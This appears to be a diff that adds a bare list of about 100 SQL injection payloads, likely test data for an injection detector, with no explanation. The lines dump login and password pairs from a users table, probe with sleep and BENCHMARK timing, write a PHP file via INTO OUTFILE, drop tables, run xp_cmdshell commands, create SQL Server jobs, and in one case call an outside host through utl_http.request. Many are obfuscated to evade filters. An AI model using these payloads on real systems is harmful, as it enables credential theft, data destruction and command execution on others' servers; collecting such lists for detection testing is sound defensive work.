@@ -1,0 +1,100 @@
+-1 union select null, listagg(login || ':' || pass,', ') within group (order by login) from users;
+-1 union select null, xmlagg(xmlelement("user",login || ':' || pass).getStringVal() from users;
+-1 union select null, stragg(login || ':' || pass ||', ') from users;
+-1 union select listagg(login || ':' || pass,', ') within group (order by login) from users;                  
+users.id%0D%0A%23asd%0D%0Aunion%0D%0A%23asd%0D%0Aselect%0D%0A%23asd%0D%0A--a-%0D%0A%23aaa%0D%0Aaa+%0D%0A%23asd%0D%0A--a-%0D%0A%23aaa%0D%0Afrom%0D%0A%23asd%0D%0A--a-%0D%0A%23aaa%0D%0Aasdasd
+1'=sleep(1)='1                            
+1 and select (utl_http.request('http://client9.com/') || select listagg(login || chr(58) || pass || ', ') within group (order by login) from dual) is not null;
+-1 union select top 1 null, lead(pass, 0) over (order by pass) from users;
+-1 union select null, array_to_json(array_agg(users))::text from users limit 1;
+1 and (select array_to_json(array_agg(users))::text::bool from users limit 1;
+' UNION SELECT 0x14CmsVwmDJfsa7wFVp24rwqH7z4MMjZVYN545b227272225d293b3f3e,null,null,null,null,null,null,null,null,null,null,null,null,null INTO OUTFILE 'afile.php'
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
+1 and true; BEGIN DECLARE @xy varchar(8000)
+1; BEGIN DECLARE @xy varchar(8000)
+x' and 1 = 0; BEGIN DECLARE
+x' AND 1=0; DROP TABLE TMP_DB;
+' AND 1=0; DECLARE @S VARCHAR(4000) SET @S
+' IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE
+(--- 0)'=(currenT_user()-3) union select 1,2,3 from users; -- -
+1=1 AND-+-+-+-+~~((1))
+1-- foo sp_password
+1'--sp_password
+foo' Eqv StrComp(username, 0x12+0x34+0xab+0xcd,0) Imp 'a
+b'1' UNION SELECT 1
+x'1' UNION SELECT 1
+n'1' UNION SELECT 1
+1 having 1 limit 1 union select 1--
+1 having (1) limit 1 union select 1--
+1 having -(1) limit 1 union select 1--
+1 having sin(1) limit 1 union select 1--
+1 having 1 limit 2 group by 3 union select 1--
+1 group by 2 union select 1 --
+sin(1) group by 1 union select 1--
+@version group by 1 union select 1--
+@version group by (-1) union select 1--
+(@version) group by -1 union select 1--
+(@version) group by (-1) union select 1--
+(@version)) group by (-1) union select 1--
+(1)) group by (-1) union select 1--
+(@version) group by sin(-1) union select 1--
+1 group by sin(1) union select 1--
+1 group by 1 - sin(1) union select 1--
+1 group by (sin(1)) union select 1--
+-1 group by -(-sin(1)) union select 1--
+sin(1) group by (-sin(1)) union select 1--
+sin(1)-1 group by (-sin(1)) union select 1--
+sin(1)-1 group by 1 union select 1--
+1 group by ((1)) union select 1--
+1 group by (((1))) union select 1--
+((1)) group by (1) union select 1--
+(1) group by ((1)) union select 1--
+(1) group by (1) union select 1--
+-(1) is not unknown having 1 order by 1 limit 1 for update  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown  for update  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown having 1 order by 1 limit 1  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown having 1  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown having 1 UNION select table_name from information_schema.tables limit 1
+-(1) is unknown having 1 UNION select table_name from information_schema.tables limit 1
+-(1) for update  UNION select table_name from information_schema.tables limit 1
+1 for update UNION select table_name from information_schema.tables limit 1
+-(1) for update UNION select table_name from information_schema.tables limit 1
+-(true) for update UNION select table_name from information_schema.tables limit 1
+-(null) for update UNION select table_name from information_schema.tables limit 1
+-(\N) for update UNION select table_name from information_schema.tables limit 1
+-(\N) for update having true UNION select table_name from information_schema.tables limit 1
+-(\N) for update having 1 UNION select table_name from information_schema.tables limit 1
+-(1) for update having 1 UNION select table_name from information_schema.tables limit 1
+-(1)  having 1 for updateUNION select table_name from information_schema.tables limit 1
+-(1)  having 1 for update UNION select table_name from information_schema.tables limit 1
+-(1) having 1 for update UNION select table_name from information_schema.tables limit 1
+\''; DROP TABLE users; --
+\''); DROP TABLE users; --
+\''; /* one */ ;DROP TABLE users; --
+\''; select 1; drop table users; --
+1; USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
+1; EXECUTE AS LOGIN 'root'; GO xp_cmdshell 'whoami.exe' ; REVERT ;
+1; USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
+1); USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
+EXEC sp_add_job @job_name = 'TestJob';
+EXECUTE sp_add_job @job_name = 'TestJob';
+1;EXECUTE sp_add_job @job_name = 'TestJob';
+1;print 'foo'; exec xp_cmdshell 'destroy';
+-1 - (select (1 - select (select 1))) union all select 2 --
+-1 - (select 1) - union all select 2 --
+(select 1) - 1 union all select 2 --
+((select 1) - 1) + (select 1) union all select 2 --
+(select (select (select 1))) union all select 2 --
+(select (select (select 1))) union all select 2 --
+(select ((select (select 1))) union all select 2 --
+(select (select ((select 1))) union all select 2 --
+(select ((select 1 - (select 1))) union all select 2 --
+(select (select (((select 1))) union all select 2 --
+(select ((select (select 1))) union all select 2 --
+(select (((select (select 1))) union all select 2 --
+(select (select (1 - select 1))) union all select 2 --
+(select (select 1 - (select 1))) union all select 2 --
+(select 1 - (select 1 - (select 1))) union all select 2 --
+-1 union distinct select table_name from information_schema.tables
